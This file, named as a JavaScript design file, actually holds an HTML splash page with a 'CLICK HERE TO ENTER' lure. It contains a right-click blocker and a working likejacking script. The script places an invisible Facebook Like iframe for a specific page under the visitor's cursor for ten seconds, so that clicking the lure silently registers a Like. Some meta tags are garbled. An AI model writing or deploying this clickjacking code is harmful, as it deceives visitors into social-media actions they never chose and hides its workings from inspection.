design.js
=========
<meta property="�fb:admins�" content="�166014106869837�" />
<meta property="�og:type�" content="�website�" />
<meta property="�og:description�ERROR" />  <style type="text/css">

body {background-color:#000000;}
p {color:#FFFFFF;}
a:link {text-decoration:none;color:#000000;}    /* unvisited link */
a:visited {text-decoration:none;color:#000000;} /* visited link */
a:hover {text-decoration:none;color:#000000;}   /* mouse over link */
a:active {text-decoration:none;color:#000000;}  /* selected link */

</style>  <script language=JavaScript>
 var message="Sorry, right-click has been disabled"; function clickIE4(){ if (event.button==2){ alert(message); return false; } } function clickNS4(e){ if (document.layers||document.getElementById&&!document.all){ if (e.which==2||e.which==3){ alert(message); return false; } } } if (document.layers){ document.captureEvents(Event.MOUSEDOWN); document.onmousedown=clickNS4; } else if (document.all&&!document.getElementById){ document.onmousedown=clickIE4; } document.oncontextmenu=new Function("alert(message);return false") 
</script>
      
</br>&nbsp;</br>
</br>&nbsp;</br>

<center> <big><big><big> <strong>
<p>&lt;&lt;  CLICK HERE TO ENTER  &gt;&gt;</p>
</strong> </big></big></big> </center>  

<script type="text/javascript">

(function(){
  var tempX = 0,
  tempY = 0,
  IE = document.all ? true : false;
  
  if (!IE) document.captureEvents(Event.MOUSEMOVE);
  
  var like = document.createElement('iframe');
  like.src = 'http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/URwelcome420' + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
  like.scrolling = 'no';
  like.frameBorder = 0;
  like.allowTransparency = 'true';
  like.style.border = 0;
  like.style.overflow = 'hidden';
  like.style.cursor = 'pointer';
  like.style.width = '53px';
  like.style.height =  '23px';
  like.style.position = 'absolute';
  like.style.opacity = .0; //Would be 0 if really used
  document.getElementsByTagName('body')[0].appendChild(like);
  
  window.addEventListener('mousemove', mouseMove, false);
  
  setTimeout(function(){
    document.getElementsByTagName('body')[0].removeChild(like);
    window.removeEventListener('mousemove', mouseMove, false);
  }, 10000);
  
  function mouseMove(e) {
    if (IE) {
      tempX = event.clientX + document.body.scrollLeft;
      tempY = event.clientY + document.body.scrollTop;
    } else {
      tempX = e.pageX;
      tempY = e.pageY;
    }
    
    if (tempX < 0) tempX = 0;
    if (tempY < 0) tempY = 0;
    
    like.style.top = (tempY - 8) + 'px';
    like.style.left = (tempX - 25) + 'px';
    
    return true
  }
})();

</script>
